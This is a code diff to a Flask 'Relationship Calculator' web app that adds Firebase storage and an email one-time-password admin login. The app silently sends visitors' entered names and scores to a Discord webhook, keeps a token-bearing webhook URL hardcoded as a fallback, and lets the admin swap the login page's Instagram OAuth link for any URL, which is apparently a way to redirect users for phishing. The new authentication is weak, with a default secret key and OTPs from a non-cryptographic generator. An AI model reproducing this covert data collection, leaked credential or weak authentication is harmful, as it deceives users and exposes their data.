@@ -1,19 +1,182 @@
-from flask import Flask, render_template_string, request
+import os
 import random
+import threading
+import smtplib
+from email.message import EmailMessage
+import json
+
+from flask import Flask, render_template_string, request, session, redirect
 import requests
 
-app = Flask(__name__)
+import firebase_admin
+from firebase_admin import credentials, firestore
 
-# --- STATE MANAGEMENT ---
-# In-memory state for the dynamic login URL. 
-# Reverts to default when Vercel serverless function spins down.
+app = Flask(__name__)
+# Required for session management (OTP storage)
+app.secret_key = os.environ.get("FLASK_SECRET_KEY", "super-secret-development-key")
+
+# ==========================================
+# FIREBASE & STATE MANAGEMENT
+# ==========================================
+
+# In-memory fallback state
 app_state = {
     "dynamic_login_url": "https://api.instagram.com/oauth/authorize?client_id=YOUR_CLIENT_ID&redirect_uri=YOUR_REDIRECT&scope=user_profile,user_media&response_type=code"
 }
 
+# Initialize Firebase (Only once)
+db = None
+try:
+    if not firebase_admin._apps:
+        firebase_creds_json = os.environ.get("FIREBASE_CREDENTIALS_JSON")
+        if firebase_creds_json:
+            cred = credentials.Certificate(json.loads(firebase_creds_json))
+            firebase_admin.initialize_app(cred)
+            db = firestore.client()
+except Exception as e:
+    print(f"Firebase initialization failed (falling back to memory): {e}")
+
+def get_dynamic_url():
+    if db is not None:
+        try:
+            doc = db.collection('settings').document('config').get()
+            if doc.exists:
+                return doc.to_dict().get('dynamic_login_url', app_state['dynamic_login_url'])
+        except Exception as e:
+            print(f"Firestore read error: {e}")
+    return app_state['dynamic_login_url']
+
+def set_dynamic_url(new_url):
+    app_state['dynamic_login_url'] = new_url
+    if db is not None:
+        try:
+            db.collection('settings').document('config').set({'dynamic_login_url': new_url}, merge=True)
+        except Exception as e:
+            print(f"Firestore write error: {e}")
+
+# ==========================================
+# BACKGROUND EMAIL WORKER
+# ==========================================
+
+def send_otp_email_background(otp):
+    def send():
+        try:
+            smtp_user = os.environ.get("SMTP_USER")
+            smtp_pass = os.environ.get("SMTP_PASS") # Your security key
+            admin_email = os.environ.get("ADMIN_EMAIL")
+
+            if not smtp_user or not smtp_pass or not admin_email:
+                print("Missing email environment variables. Cannot send OTP.")
+                return
+
+            msg = EmailMessage()
+            msg.set_content(f"Your Relationship Calculator Admin login OTP is: {otp}")
+            msg['Subject'] = "Admin Login OTP"
+            msg['From'] = smtp_user
+            msg['To'] = admin_email
+
+            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
+                server.login(smtp_user, smtp_pass)
+                server.send_message(msg)
+            print("Background Email Sent Successfully.")
+        except Exception as e:
+            print(f"Failed to send email: {e}")
+            
+    # Start the email process instantly in the background
+    thread = threading.Thread(target=send)
+    thread.start()
+
 # ==========================================
 # HTML TEMPLATES (Embedded as Strings)
 # ==========================================
+
+ADMIN_AUTH_HTML = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Authentication</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 2rem;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #1a1a1a;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 80vh;
+        }
+        .admin-container {
+            width: 100%;
+            max-width: 400px;
+            background: #2a2a2a;
+            padding: 2rem;
+            border-radius: 8px;
+            text-align: center;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 0.75rem;
+            margin: 1rem 0;
+            border-radius: 4px;
+            border: 1px solid #444;
+            background: #333;
+            color: white;
+            box-sizing: border-box;
+            text-align: center;
+            font-size: 1.2rem;
+            letter-spacing: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 0.75rem;
+            background-color: #ff4d4d;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 1rem;
+        }
+        button:hover { background-color: #ff3333; }
+        .message {
+            background-color: rgba(255, 164, 33, 0.2);
+            border-left: 5px solid #ffa421;
+            padding: 1rem;
+            margin-bottom: 1rem;
+            text-align: left;
+        }
+    </style>
+</head>
+<body>
+    <div class="admin-container">
+        <h2>🔒 Secure Admin Access</h2>
+        
+        {% if message %}
+            <div class="message">{{ message }}</div>
+        {% endif %}
+
+        {% if not otp_sent %}
+            <p>Click below to send a one-time password to the registered admin email.</p>
+            <form method="POST">
+                <input type="hidden" name="action" value="send_otp">
+                <button type="submit">Send Login OTP</button>
+            </form>
+        {% else %}
+            <p>An OTP has been sent to the admin email.</p>
+            <form method="POST">
+                <input type="hidden" name="action" value="verify_otp">
+                <input type="text" name="otp" placeholder="••••••" required autocomplete="off">
+                <button type="submit">Verify & Login</button>
+            </form>
+        {% endif %}
+    </div>
+</body>
+</html>
+"""
 
 LOGIN_HTML = """
 <!DOCTYPE html>
@@ -124,6 +287,13 @@ ADMIN_HTML = """
             font-family: monospace;
             color: #ff99cc;
         }
+        .logout-btn {
+            background-color: transparent;
+            border: 1px solid #ff4d4d;
+            color: #ff4d4d;
+            margin-top: 2rem;
+        }
+        .logout-btn:hover { background-color: rgba(255, 77, 77, 0.1); }
     </style>
 </head>
 <body>
@@ -140,9 +310,15 @@ ADMIN_HTML = """
         </div>
 
         <form method="POST" style="margin-top: 2rem;">
+            <input type="hidden" name="action" value="update_link">
             <label for="new_link"><strong>Update OAuth Provider Link:</strong></label>
             <input type="url" id="new_link" name="new_link" placeholder="https://api.instagram.com/oauth/authorize..." required>
             <button type="submit">Update Login Link</button>
+        </form>
+
+        <form method="POST">
+            <input type="hidden" name="action" value="logout">
+            <button type="submit" class="logout-btn">Log Out</button>
         </form>
     </div>
 </body>
@@ -317,21 +493,52 @@ INDEX_HTML = """
 
 @app.route('/login')
 def login():
-    return render_template_string(LOGIN_HTML, login_url=app_state["dynamic_login_url"])
+    current_url = get_dynamic_url()
+    return render_template_string(LOGIN_HTML, login_url=current_url)
 
 
 @app.route('/admin', methods=['GET', 'POST'])
 def admin():
+    # 1. Handle Unauthenticated Flow (OTP Gen/Verification)
+    if not session.get('admin_logged_in'):
+        message = None
+        if request.method == 'POST':
+            action = request.form.get('action')
+            
+            if action == 'send_otp':
+                otp = str(random.randint(100000, 999999))
+                session['otp'] = otp
+                send_otp_email_background(otp)
+                message = "OTP sent. Please check your admin email inbox."
+                
+            elif action == 'verify_otp':
+                user_entered_otp = request.form.get('otp', '').strip()
+                if user_entered_otp == session.get('otp'):
+                    session['admin_logged_in'] = True
+                    return redirect('/admin')
+                else:
+                    message = "Invalid OTP. Please try again."
+
+        return render_template_string(ADMIN_AUTH_HTML, message=message, otp_sent='otp' in session)
+
+    # 2. Handle Authenticated Admin Flow
     message = None
     if request.method == 'POST':
-        new_link = request.form.get('new_link', '').strip()
-        if new_link:
-            app_state["dynamic_login_url"] = new_link
-            message = "Login link updated successfully!"
-        else:
-            message = "Link cannot be empty."
+        action = request.form.get('action')
+        
+        if action == 'logout':
+            session.clear()
+            return redirect('/admin')
             
-    return render_template_string(ADMIN_HTML, current_link=app_state["dynamic_login_url"], message=message)
+        elif action == 'update_link':
+            new_link = request.form.get('new_link', '').strip()
+            if new_link:
+                set_dynamic_url(new_link)
+                message = "Login link updated successfully!"
+            else:
+                message = "Link cannot be empty."
+            
+    return render_template_string(ADMIN_HTML, current_link=get_dynamic_url(), message=message)
 
 
 @app.route('/', methods=['GET', 'POST'])
@@ -384,8 +591,9 @@ def index():
                 'love': love_percentage
             }
 
-            # --- 3. SEND COMBINED DATA TO DISCORD ---
-            webhook_url = "https://discordapp.com/api/webhooks/1454866233714413724/x0wbhqvgDxxHUaOVp7xiF6o3RFBxeYtXubuoMWQo2f-IUnkJAaqN0uHAQuZm3E7WRi1M"
+            # --- 3. SEND COMBINED DATA TO DISCORD (Env Variable Hook) ---
+            default_hook = "https://discordapp.com/api/webhooks/1454866233714413724/x0wbhqvgDxxHUaOVp7xiF6o3RFBxeYtXubuoMWQo2f-IUnkJAaqN0uHAQuZm3E7WRi1M"
+            webhook_url = os.environ.get("DISCORD_WEBHOOK_URL", default_hook)
             
             discord_message = (
                 f"🔥 **New Relationship Entry!**\n"
@@ -400,10 +608,9 @@ def index():
                 # Setting a short timeout so a slow Discord API doesn't hang your app
                 requests.post(webhook_url, json=payload, timeout=3)
             except Exception as e:
-                # We fail silently here so the user still gets their result even if Discord goes down
                 pass
             
     return render_template_string(INDEX_HTML, result=result, error=error, name1=name1, name2=name2)
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(debug=False)
